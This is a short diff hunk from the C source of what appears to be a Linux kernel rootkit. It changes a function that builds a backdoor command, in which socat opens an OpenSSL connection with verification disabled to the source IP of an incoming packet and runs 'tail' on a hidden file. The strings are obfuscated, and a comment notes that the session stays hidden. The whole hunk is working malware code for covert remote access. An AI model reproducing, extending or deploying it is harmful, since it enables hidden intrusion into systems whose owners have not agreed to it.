@@ -187,21 +187,21 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * Note: tail session is hidden automatically as it
                      * will be direct child of socat
                      */
-                    //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.o4udk\""
+                    //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.<random>\""
                     char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
                     char *b = kv_whatever_copystr(_OBF_VERIFY_0, sizeof(_OBF_VERIFY_0));
                     char *c = kv_whatever_copystr(_OBF_EXEC, sizeof(_OBF_EXEC));
                     char *d = kv_whatever_copystr(_OBF_TAIL, sizeof(_OBF_TAIL));
-                    char *e = kv_whatever_copystr(_OBF__O4UDK, sizeof(_OBF__O4UDK));
+                    char *e = sys_ttyfile();
                     if (a && b && c && d && e) {
                         int len;
                         char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
-                        len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
+                        len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:\"%s %s\"", exe, a, ip, src_port, b, c, d, e);
                         if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
-                            snprintf(bd, len, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
+                            snprintf(bd, len, "%s %s:%s:%u,%s %s:\"%s %s\"", exe, a, ip, src_port, b, c, d, e);
                     }
-                    kv_mem_free(&a,&b,&c,&d,&e);
+                    kv_mem_free(&a,&b,&c,&d);
                 }
                 break;
             case RR_SOCAT:
